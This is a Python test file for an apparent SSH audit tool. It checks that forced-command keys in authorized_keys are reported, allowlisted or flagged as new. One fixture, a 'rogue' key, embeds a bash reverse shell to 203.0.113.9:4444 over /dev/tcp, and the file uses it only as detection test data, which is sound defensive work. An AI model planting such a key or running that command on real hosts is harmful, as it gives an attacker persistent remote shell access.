# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 Forex Robotics Co., Ltd.

"""#87: forced-command keys matching [audit] allowed_forced_commands are not
reported; others still are, with the command shown."""

from __future__ import annotations

from kevward.audit import _check_authkeys, forced_commands
from kevward.config import Config

COLLECT = ('command="/opt/kevward/bin/kevward report --trends --audit",no-pty '
           'ssh-ed25519 AAAA collect')
ROGUE = 'no-pty,command="bash -i >& /dev/tcp/203.0.113.9/4444 0>&1" ssh-rsa AAAA x'
PLAIN = "ssh-ed25519 AAAA ktakahashi@pc"


def _keys(tmp_path, *lines):
    p = tmp_path / "authorized_keys"
    p.write_text("\n".join(lines) + "\n")
    p.chmod(0o600)
    return [str(p)]


def test_parse_forced_commands():
    assert forced_commands(COLLECT) == ["/opt/kevward/bin/kevward report --trends --audit"]
    assert forced_commands('from="10.0.0.1",command="echo \\"hi\\"" ssh-rsa A') == ['echo "hi"']
    assert forced_commands(PLAIN) == []
    assert forced_commands("ssh-rsa AAAA note command=\"x\"") == []  # in the comment


def test_unlisted_forced_command_is_reported(tmp_path):
    f = _check_authkeys(None, _keys(tmp_path, COLLECT, PLAIN))
    assert len(f) == 1 and "1 forced-command" in f[0].title
    assert "/opt/kevward/bin/kevward report" in f[0].detail


def test_allowlisted_forced_command_is_silent(tmp_path):
    allow = ["/opt/kevward/bin/kevward report *"]
    assert _check_authkeys(allow, _keys(tmp_path, COLLECT, PLAIN)) == []


def test_allowlist_does_not_hide_other_keys(tmp_path):
    allow = ["/opt/kevward/bin/kevward report *"]
    f = _check_authkeys(allow, _keys(tmp_path, COLLECT, ROGUE))
    assert len(f) == 1 and "1 forced-command" in f[0].title
    assert "/dev/tcp" in f[0].detail


def test_config_loads_audit_section(tmp_path):
    p = tmp_path / "kevward.toml"
    p.write_text('[audit]\nallowed_forced_commands = ["rrsync *"]\n')
    assert Config.load(p).audit.allowed_forced_commands == ["rrsync *"]
    assert Config().audit.allowed_forced_commands == []


# --- #215: keys added since the previous report stand out ------------------------

STILLE = 'command="/opt/stille-pro/bin/dispatch",restrict ssh-ed25519 BBBB stille'


def test_new_key_is_marked_then_ages_out(tmp_path):
    state = str(tmp_path / "state" / "forced.json")
    paths = _keys(tmp_path, ROGUE, PLAIN)
    # first run: baseline, nothing is "new"
    f = _check_authkeys(None, paths, state_path=state, now=1000.0)
    assert [x.severity.value for x in f] == ["low"] and not f[0].title.startswith("NEW")
    # a key appears
    (tmp_path / "authorized_keys").write_text("\n".join([ROGUE, PLAIN, STILLE]) + "\n")
    f = _check_authkeys(None, paths, state_path=state, now=90000.0)
    new = [x for x in f if x.title.startswith("NEW")]
    old = [x for x in f if not x.title.startswith("NEW")]
    assert len(new) == 1 and new[0].severity.value == "medium"
    assert "/opt/stille-pro/bin/dispatch" in new[0].detail
    assert "bash -i" not in new[0].detail and "1 forced-command" in old[0].title
    # same day re-run: still new; after two days: ordinary
    assert any(x.title.startswith("NEW") for x in
               _check_authkeys(None, paths, state_path=state, now=100000.0))
    f = _check_authkeys(None, paths, state_path=state, now=90000.0 + 2 * 86400)
    assert not any(x.title.startswith("NEW") for x in f)
    assert "2 forced-command" in f[0].title


def test_removed_then_readded_is_new_again(tmp_path):
    state = str(tmp_path / "forced.json")
    ak = tmp_path / "authorized_keys"
    paths = _keys(tmp_path, ROGUE)
    _check_authkeys(None, paths, state_path=state, now=0.0)        # baseline
    ak.write_text(PLAIN + "\n")
    _check_authkeys(None, paths, state_path=state, now=10.0 ** 6)  # gone: forgotten
    ak.write_text(ROGUE + "\n")
    f = _check_authkeys(None, paths, state_path=state, now=2 * 10.0 ** 6)
    assert f[0].title.startswith("NEW")


def test_allowed_and_own_gate_never_new(tmp_path):
    state = str(tmp_path / "forced.json")
    paths = _keys(tmp_path, PLAIN)
    _check_authkeys(None, paths, state_path=state, now=0.0)
    gate = ('command="sudo -n /opt/kevward/bin/kevward ssh-gate --role operate",'
            "restrict ssh-ed25519 C c")
    (tmp_path / "authorized_keys").write_text("\n".join([PLAIN, COLLECT, gate]) + "\n")
    assert _check_authkeys(["/opt/kevward/bin/kevward report *"], paths,
                           state_path=state, now=10.0) == []


def test_unreadable_state_marks_nothing(tmp_path):
    state = tmp_path / "forced.json"
    state.write_text("{not json")
    f = _check_authkeys(None, _keys(tmp_path, ROGUE), state_path=str(state), now=1.0)
    assert [x.title.startswith("NEW") for x in f] == [False]
